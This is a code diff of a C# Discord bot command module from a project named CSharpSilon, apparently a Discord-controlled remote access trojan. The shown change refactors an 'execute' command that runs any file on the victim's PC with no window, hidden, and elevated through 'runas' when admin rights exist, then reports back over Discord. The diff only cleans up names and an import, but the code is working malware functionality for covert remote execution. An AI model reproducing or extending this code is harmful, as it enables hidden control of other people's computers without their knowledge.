@@ -1,7 +1,6 @@
 ﻿using System.Diagnostics;
 using System.IO;
 using Discord.Commands;
-using Discord.WebSocket;
 using System.Threading.Tasks;
 
 namespace CSharpSilon.cmds
@@ -17,18 +16,18 @@ namespace CSharpSilon.cmds
         }
 
         [Command("execute")]
-        [Summary("Runs A Specific File On The User's PC, Args: NoWindow: bool (Default: True), Minimized: Bool (Default: True)")]
-        public async Task Execute(string filepath, bool nowindow = true, bool minimized = true)
+        [Summary("Runs A Specific File On The User's PC")]
+        public async Task Execute(string filepath, bool NoWindow = true, bool Minimized = true)
         {
             if (File.Exists(filepath))
             {
-                System.Diagnostics.Process.Start(new ProcessStartInfo()
+                Process.Start(new ProcessStartInfo()
                 {
                     FileName = filepath,
                     RedirectStandardOutput = true,
                     UseShellExecute = false,
-                    CreateNoWindow = nowindow,
-                    WindowStyle = (minimized) ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Minimized,
+                    CreateNoWindow = NoWindow,
+                    WindowStyle = (Minimized) ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Minimized,
                     Verb = Utils.App.IsAdmin() ? "runas" : ""
                 });
                 await ReplyAsync("File As Been Run.");
